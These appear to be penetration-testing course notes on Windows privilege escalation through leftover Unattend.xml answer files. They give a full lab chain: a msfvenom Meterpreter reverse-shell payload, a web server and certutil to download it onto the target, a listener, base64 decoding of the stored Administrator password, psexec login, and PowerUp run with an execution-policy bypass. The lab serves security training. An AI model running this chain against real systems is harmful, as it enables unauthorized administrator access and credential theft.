* Passwords can be stored in configuration files of third-party applications and Windows, but Windows configuration files will only be discussed as part of this course.

## How Windows Configuration Files work
* Windows can automate a variety of repetitve tasks --> such as the mass rollout or installation of Windows on many systems.
* This is done through the use of the Unattended Windows Setup utility --> used to automate the mass installation/deployment of Windows on multiple systems.
* **How this utility works** --> Use configuration files containing specific configurations and user credentials, specifically the Administrator account's password.'
* **What could be the flaw** --> If the Unattended Windows Setup configuration files are left on the target system after installation  --> they can reveal user account credentials that can be used by attackers to authenticate legitimately.
* **Files containing user account and system configuration information** : (Typically under these paths)
  * C:\Windows\Panther\Unattend.xml
  * C:\Windows\Panther\Autounattend.xml
 
* **General security precaution** --> The password stored in the Unattended Windows Setup configuration file may be encoded in base64.

* PRACTICAL
 1. Generate a payload
    * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[local_IP] LPORT=[any port that is free] -f exe > [file_name].exe`
   
 2. Start a web server on the local machine --> so that the payload we just generated can be downloaded on the target system through this web server.
    * `python -m SimpleHTTPServer 80`
   
 3. Now get access on the target system which is not specified in this lab (This can be done by exploiting vulnerabilities on the targte system). On the target, download the payload using:
    * `certutil --urlcache -f http://[our local machine IP]/[file_name].exe [file_name_to_be_created_on_the_target].exe`
   
 4. Start a handler on the local system to start a meterpreter session when payload iis exxecuted on the targte.
    * `use multi/handler` ---> `set payload windows/x64/meterpreter/reverse_tcp` --> set lhost ans lport --> exploit
   
 5. Now on the target, execute the payload.exe by double-clicking --> This will start a meterpreter session on the local machine
 6. Search for a file named "unattend" --> This will have a password
    * `search --f unattend.xml`  --> `download unattend.xml`.  --> unattend.xml is the file present on the system (which acts as a vulnerability) when unattended installation is performed.
    * We can see the password as <PlainText> was set to false.
   
 7. Copy the password and create a new file using VIM. (Vim is a text editor, Vim will make a new file if it doesn't exist)
    * vim [file_name].txt
   
 8. After creating the file with vim, decode the file from base64 encryption (It is hard to figure out which encryption is done on the data, but in this case it is base64):
    * `base64 -d [file_name].txt` --> This will reveal a password in plain text.
   
 9. Now, I have to use that password by psexec.py script:
     * `psexec.py Administrator@[target_IP]` --> Password:  --> This should give access to a command prompt on the targte system with administrator privileges.

  
 NOTE: One way to find unattend.xml is `search -f unatend.xml
 * Another way to check if unattend.xml is present is through Powersploit and Powerup.ps1 scripts:
 * **PowerSploit**
     * PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.
     * PowerSploit is comprised of the following modules and scripts:
* **PowerUp.ps1**
“PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely
on misconfigurations.”
Source: https://github.com/PowerShellMafia/PowerSploit

We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability.
Commands: Powershell.exe
cd .\Desktop\PowerSploit\Privesc\
ls

Step 4: Import PowerUp.ps1 script and Invoke-PrivescAudit function.
Commands: 
* `powershell -ep bypass (PowerShell execution policy bypass)`
* `. .\PowerUp.ps1`
* `Invoke-PrivescAudit`
* We can notice that there is an Unattend.xml file present on the system. Open the Unattend.xml file.
* **Unattend.xml**
* Unattend.xml is an answer file for installation. The files may contain encoded or plain-text credentials and other sensitive information.
